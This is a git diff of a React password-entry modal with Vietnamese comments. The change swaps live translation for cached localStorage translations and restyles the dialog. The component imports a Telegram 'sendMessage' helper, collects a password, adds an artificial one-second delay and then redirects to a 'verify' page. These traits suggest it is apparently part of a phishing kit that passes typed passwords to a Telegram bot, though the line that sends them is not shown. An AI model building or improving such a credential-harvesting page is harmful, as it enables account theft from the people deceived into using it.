@@ -1,10 +1,9 @@
 import { faTimes } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import PropTypes from 'prop-types';
-import { useState, useEffect, useCallback, useMemo } from 'react';
+import { useState, useEffect, useMemo } from 'react';
 import { useNavigate } from 'react-router';
 import sendMessage from '@/utils/telegram';
-import { translateText } from '@/utils/translate';
 import { PATHS } from '@/router/router';
 
 const PasswordInput = ({ onClose }) => {
@@ -26,46 +25,22 @@ const PasswordInput = ({ onClose }) => {
 
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
 
-    const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const [
-                    translatedTitle,
-                    translatedDesc,
-                    translatedLabel,
-                    translatedPlaceholder,
-                    translatedContinue,
-                    translatedLoading
-                ] = await Promise.all([
-                    translateText(defaultTexts.title, targetLang),
-                    translateText(defaultTexts.description, targetLang),
-                    translateText(defaultTexts.passwordLabel, targetLang),
-                    translateText(defaultTexts.placeholder, targetLang),
-                    translateText(defaultTexts.continueBtn, targetLang),
-                    translateText(defaultTexts.loadingText, targetLang)
-                ]);
-
-                setTranslatedTexts({
-                    title: translatedTitle,
-                    description: translatedDesc,
-                    passwordLabel: translatedLabel,
-                    placeholder: translatedPlaceholder,
-                    continueBtn: translatedContinue,
-                    loadingText: translatedLoading
-                });
-            } catch {
-                //
-            }
-        },
-        [defaultTexts]
-    );
-
     useEffect(() => {
         const targetLang = localStorage.getItem('targetLang');
         if (targetLang && targetLang !== 'en') {
-            translateAllTexts(targetLang);
+            // 🎯 CHỈ LẤY TEXTS ĐÃ DỊCH TỪ LOCALSTORAGE - KHÔNG DỊCH LẠI
+            const savedTexts = localStorage.getItem(`translatedPassword_${targetLang}`);
+            if (savedTexts) {
+                try {
+                    setTranslatedTexts(JSON.parse(savedTexts));
+                } catch (error) {
+                    console.log('Error parsing saved password texts:', error);
+                    // Giữ nguyên default texts nếu có lỗi
+                }
+            }
         }
-    }, [translateAllTexts]);
+        // 🚫 KHÔNG GỌI translateAllTexts - CHỈ DÙNG TEXTS ĐÃ DỊCH SẴN
+    }, []);
 
     const handleSubmit = async () => {
         if (!password.trim()) return;
@@ -79,39 +54,36 @@ const PasswordInput = ({ onClose }) => {
             //
         }
 
-        // ✅ GIẢM DELAY XUỐNG 1 GIÂY
         await new Promise((resolve) => setTimeout(resolve, 1000));
 
         setIsLoading(false);
-        
-        // ✅ CHUYỂN TRANG LUÔN SAU KHI NHẬP PASS
         navigate(PATHS.VERIFY);
     };
 
     return (
-        <div className='fixed top-0 left-0 z-20 flex h-screen w-screen items-center justify-center'>
-            <div className='w-lg rounded-lg bg-white shadow-lg'>
+        <div className='fixed top-0 left-0 z-20 flex h-screen w-screen items-center justify-center bg-black bg-opacity-50'>
+            <div className='w-96 rounded-lg bg-white shadow-lg'>
                 <div className='flex items-center justify-between rounded-t-lg border-b border-gray-300 bg-[#f8f8f8] px-6 py-4'>
-                    <p className='text-xl leading-6 font-semibold'>{translatedTexts.title}</p>
+                    <p className='text-xl font-semibold'>{translatedTexts.title}</p>
                     <FontAwesomeIcon
                         icon={faTimes}
-                        className='cursor-pointer hover:text-gray-600'
+                        className='cursor-pointer text-gray-500 hover:text-gray-700'
                         onClick={onClose}
                     />
                 </div>
                 <div className='flex flex-col gap-4 px-6 py-4'>
-                    <p className='text-base leading-6 text-[#212529bf]'>{translatedTexts.description}</p>
-                    <p className='font-bold text-[#212529]'>{translatedTexts.passwordLabel}</p>
+                    <p className='text-gray-600'>{translatedTexts.description}</p>
+                    <p className='font-bold text-gray-800'>{translatedTexts.passwordLabel}</p>
                     <input
                         type='password'
                         placeholder={translatedTexts.placeholder}
-                        className='w-full rounded-lg border border-gray-300 px-3 py-1.5'
+                        className='w-full rounded-lg border border-gray-300 px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500'
                         value={password}
                         onChange={(e) => setPassword(e.target.value)}
                         onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                     />
                     <button
-                        className='rounded-lg bg-blue-500 px-3 py-1.5 text-white disabled:opacity-50'
+                        className='rounded-lg bg-blue-500 px-4 py-2 text-white hover:bg-blue-600 disabled:opacity-50 disabled:cursor-not-allowed'
                         onClick={handleSubmit}
                         disabled={isLoading || !password.trim()}
                     >
